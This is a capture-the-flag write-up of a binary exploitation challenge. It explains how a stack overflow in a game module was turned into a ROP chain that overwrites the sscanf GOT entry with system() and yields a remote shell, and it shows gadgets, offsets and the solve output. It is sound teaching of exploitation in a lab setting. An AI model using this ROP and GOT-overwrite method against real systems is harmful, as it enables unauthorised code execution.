# I'm ROPen to suggestions - Points: 125 - (Solves: 10)

**Category**: Binary Exploitation

**Description**: We've identified another vulnerable service running on a
developer's computer. This one seems to be built modularly, and resistant to
smashing! Files: files.tar.xz. Listening on `challenge.acictf.com:31803`

**Hints**:
- Have you seen where the games get loaded at?
- The challenge is 125 points; the bug is not esoteric or hard to understand.

## Solution

Unpacking the provided tar file reveals a main binary, along with 9 shared
objects and a copy of the target's libc. Based on the name of the challenge, it
will likely involve building a ROP chain for exploitation. Checksec indicates
the only protection enabled is NX. This seems to confirm our suspicions. Since
the challenge is only 125 points and the first challenge that might require
ROP, the vulnerability will likely be stack buffer overflow since a stack pivot
for a heap ROP chain would likely make the problem more difficult.

```
$ checksec ropen_to_suggestions
[*] '/home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/ropen_to_suggestions'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Initial reversing of the binary in IDA indicates that we need to specify
"PEOPLE SOMETIMES MAKE MISTAKES" for the third prompt to get to the main menu.
At this point, the program will load a shared object for each supported game,
and invoke its `run` callback. All games except for "GLOBAL THERMONUCLEAR WAR"
seem to work fine. The last option seems to always result in a segmentation
fault.

```
$ gdb ropen_to_suggestions
Reading symbols from ropen_to_suggestions...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/ropen_to_suggestions
WELCOME TO PWNIE'S WAR OPERATION PLAN RESPONSE.

GEETINGS PROFESSOR FALKEN.



HOW ARE YOU FEELING TODAY?



EXCELLENT. IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON JUNE 23 1973.

PEOPLE SOMETIMES MAKE MISTAKES

YES THEY DO.  SHALL WE PLAY A GAME?

0) EXIT
1) CHESS
2) TIC-TAC-TOE
3) FIGHTER COMBAT
4) GUERRILLA ENGAGEMENT
5) DESERT WARFARE
6) AIR-TO-GROUND ACTIONS
7) THEATERWIDE TACTICAL WARFARE
8) THEATERWIDE BIOTOXIC AND CHEMICAL WARFARE

9) GLOBAL THERMONUCLEAR WAR

9

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400be6 in call_method ()
=> 0x0000000000400be6 <call_method+299>:	ff d0	call   rax
(gdb) p/x $rax
$1 = 0x5320454c504f4550
```

### Off by one function pointer overwrite

If we decode the hex string in `rax` as a string, we see that it's equivalent
to the start of the string we entered `PEOPLE S`. Examining the `.data` section
of the binary in IDA shows that there is an array of 8 function pointers
containing the address of each so's `run` function. They are all initialized to
NULL, and after the module is loaded it is replaced with the `run` callback's
address. This array is immediately followed by a 512 byte buffer where our
initial input is read.

This crash appears to be an off-by-one error, where this array is interpreted
as a 9-element array of function pointers. This results in the start of our
input being used as a function pointer. If we can control this input, this
would be an excellent primitive, as it allows us to hijack control flow. Since
our input is at a static address, we could probably direct execution to a stack
pivot that will set RSP to our input buffer for full ROP.

Unfortunately, the string compare restricts our input to the crashing value
earlier, and there are no other writes to this buffer. Unless paired with
another bug, this vulnerability does not appear exploitable. It may be useful
as a primitive later.

### Partially controllable stack buffer overflow

At this point, I statically reverse engineered the entirety of the main program
(fairly small) and didn't find any additional vulnerabilities. I continued on
to each of the modules in sequence. Some could be easily ruled out as they did
not allow for interactive input. I started with the simple ones to try to rule
them out quickly.

Module           | Notes
-----------------|------------------------------------------
tictactoes.so    | Non-interactive
guerrilla.so     | Non-interactive
warfare.so       | Non-interactive
thermonuclear.so | Non-interactive
air.so           | Small program - nothing of note
dessert.so       | No apparent bugs - similar global data structures to fighter.so.
chemical.so      | Stack buffer overflow when building chemical.
figher.so        | Stack buffer overflow when fighting with swords.
chess.so         | Very complicated global data structures - might take some time to reverse. I held off on this one until last.

On my first pass, I didn't notice the vulnerability in figher.so, so I spent
several hours taking a look at chemical.so. The chemical module builds an array
of ints the length of the periodic table, where each value represents the count
of an element you've added. This buffer was 118 elements in length. You can
increment the values in this array by adding chemicals by their name. The
program will use a global lookup table to find the index for a chemical given
its name.

When showing the chemical you've built, the program will build a string in 512
byte buffer given your array of elements. For each element, it will append the
element's symbol (1-2 characters), followed by the count of the element in
decimal. If we add 1000 of each element, we can end up creating a string that
is at least `5 * 118 = 590` characters long ("H1000He1000..."). This will
greatly overflow our stack based buffer.

Unfortunately, we can only partially control the contents of the this overflow.
The last few bytes of our overflow can only consist of [0-9], and potentially
the ascii characters used in a periodic element's symbol. This makes for an
incredibly bad exploit primitive.

Additionally, on trying to produce a crash, I found that the program would
crash prior to executing the overflowed return address. Upon further inspection
in gdb, it appears our overflow was actually corrupting the counter variable
used in the loop that builds the string. Since the counter was used as an index
into our array, we end up crashing almost immediately after it is corrupted.

After a few hours of trying to capitalize on this in different ways, I put this
challenge on the shelf. My progress on this vulnerability can be seen in this
pwntools [script](exploit_chemical.py).

### Stack buffer overflow

I circled back to this challenge after a day or two and took a look at all the
modules again. At this point I noticed a classic stack buffer overflow in
fighter.so where 500 bytes of data were being read into a 100 byte stack buffer
with `fgets`. I didn't notice it before because I only reverse engineered the
first fight callback in fighter.so, and assumed all others were the same due to
the similarity in the control flow graph. It turns out if you fight using
swords, the stack buffer for the first `fgets` was arbitrarily reduced to 100
bytes in size, as opposed to 512 for the other callbacks.

Since `fgets` allows for NULL bytes, this is an excellent primitive. Since we
have a copy of the target's libc, we can use ROP to leak a pointer from our GOT
to bypass ASLR, compute the address of `system()`, and return to it with
"/bin/sh\x00".

During my reverse engineering, I noticed that the modules seemed to be loaded
at strange static addresses. Even with gdb disabling randomization, they should
be loaded at around 0x7f... Instead they were loaded at 0x4.000...

```
(gdb) info proc mapping
process 11442
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/ropen_to_suggestions
            0x601000           0x602000     0x1000     0x1000 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/ropen_to_suggestions
            0x602000           0x603000     0x1000     0x2000 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/ropen_to_suggestions
           0x113e000          0x115f000    0x21000        0x0 [heap]
        0x4100000000       0x4100001000     0x1000        0x0 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/tictactoe.so
        0x4100001000       0x4100200000   0x1ff000     0x1000 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/tictactoe.so
        0x4100200000       0x4100201000     0x1000        0x0 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/tictactoe.so
        0x4300000000       0x4300001000     0x1000        0x0 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/guerrilla.so
        0x4300001000       0x4300200000   0x1ff000     0x1000 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/guerrilla.so
        0x4300200000       0x4300201000     0x1000        0x0 /home/user/ctf-writeups/2018-cyberstakes/ropen_to_suggestions/guerrilla.so
      0x7f52c2798000     0x7f52c2958000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f52c2958000     0x7f52c2b58000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f52c2b58000     0x7f52c2b5c000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f52c2b5c000     0x7f52c2b5e000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f52c2b5e000     0x7f52c2b62000     0x4000        0x0
      0x7f52c2b62000     0x7f52c2b65000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f52c2b65000     0x7f52c2d64000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f52c2d64000     0x7f52c2d65000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f52c2d65000     0x7f52c2d66000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f52c2d66000     0x7f52c2d8c000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f52c2f67000     0x7f52c2f6b000     0x4000        0x0
      0x7f52c2f8b000     0x7f52c2f8c000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f52c2f8c000     0x7f52c2f8d000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f52c2f8d000     0x7f52c2f8e000     0x1000        0x0
      0x7ffe928f4000     0x7ffe92915000    0x21000        0x0 [stack]
      0x7ffe929dc000     0x7ffe929df000     0x3000        0x0 [vvar]
      0x7ffe929df000     0x7ffe929e1000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

Dumping the program header table for one of the objects with `readelf`
indicates a static address for the LOAD segments! This likely means the objects
are not position independent, and will be loaded at static addresses every
time. This is great for us, as we can then load and use any module for ROP
gadgets without an information disclosure.

```
$ readelf -l guerrilla.so

Elf file type is DYN (Shared object file)
Entry point 0x4300000260
There are 4 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000004300000000 0x0000004300000000
                 0x0000000000000300 0x0000000000000300  R E    200000
  LOAD           0x0000000000000300 0x0000004300200300 0x0000004300200300
                 0x0000000000000110 0x0000000000000110  RW     200000
  DYNAMIC        0x0000000000000300 0x0000004300200300 0x0000004300200300
                 0x00000000000000f0 0x00000000000000f0  RW     8
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     10

 Section to Segment mapping:
  Segment Sections...
   00     .hash .dynsym .dynstr .rela.plt .plt .text .rodata .eh_frame
   01     .dynamic .got.plt
   02     .dynamic
   03
```

We can dump the gadgets for all modules using ROPgadget.

```
ROPgadget --binary ropen_to_suggestions > gadgets
for f in *.so; do echo $f >> gadgets && ROPgadget --binary $f >> gadgets
```

In order to trigger the vulnerability, our input needs to start with an "S". We
can use pwntool's cyclic to trigger the crash. We see that the saved return
address is at offset 119 in our cyclic pattern.

```
Program received signal SIGSEGV, Segmentation fault.
0x0000004200001509 in sword () from ./fighter.so
=> 0x0000004200001509 <sword+387>:  c3  ret
(gdb) x/gx $rsp
0x7ffd026fc758: 0x6161676261616662
(gdb) !cyclic -l 0x61616662
119
```

Looking through the gadgets, there are a few that look like we will be able to
compute the address of system and then write that address to an arbitrary
memory location. This should allow us to overwrite the got entry for another
function. We can compute the address of system with the following three
gadgets:

```
pop rsi         ; pop the address of the got entry for puts() into rsi
mov rdi, [rsi]  ; read the address of puts() from the got
pop rsi         ; pop the offset from puts() to system() into rsi
add rdi, rsi    ; compute address of system() in rdi
```

We can write this computed address to another got entry with the following two
gadgets:

```
pop rsi         ; pop address to write to into rsi
mov [rsi], rdi  ; store the address of system()
```

Combining these gadgets into a ROP chain will allow us to overwrite a function
of our choosing with system(). `sscanf` presents a good target, as it is called
immediately after `fgets` in the main program with our input as the first
argument. This will allow us to specify "/bin/sh" as the argument to system().
Coding this up in a pwntools [script](solve.py) yields a shell.

```
$ ./solve.py
[+] Opening connection to challenge.acictf.com on port 31803: Done
[*] '/home/user/cyberstakes/ropen_to_suggestions/ropen_to_suggestions'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/user/cyberstakes/ropen_to_suggestions/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts_system_offset: 0x-2a300
[*] Sending ROP payload
[*] Triggering overwritten sscanf with /bin/sh
[*] Switching to interactive mode
$ id
uid=1025(i-m-ropen-to-suggestions_0) gid=1026(i-m-ropen-to-suggestions_0) groups=1026(i-m-ropen-to-suggestions_0)
$ ls
air.so
chemical.so
chess.so
dessert.so
fighter.so
files.tar.xz
flag.txt
guerrilla.so
ropen_to_suggestions
ropen_to_suggestions_no_aslr
thermonuclear.so
tictactoe.so
warfare.so
xinet_startup.sh
$ cat flag.txt
ACI{574992a84abdefdc853a496790d}
```

As a side note, I thought the hints for this challenge were misleading. Per the
hints, I would expect the vulnerability to be in the main program. I think this
may have been part of the reason for the low number of solves for this
challenge. However, I did appreciate how this challenge mirrored real-world
exploitation. There may be multiple bugs or vulnerabilities in a piece of
software, but not all are exploitable on their own. This program touched on the
problem of buggy software that may not have an apparent solution.
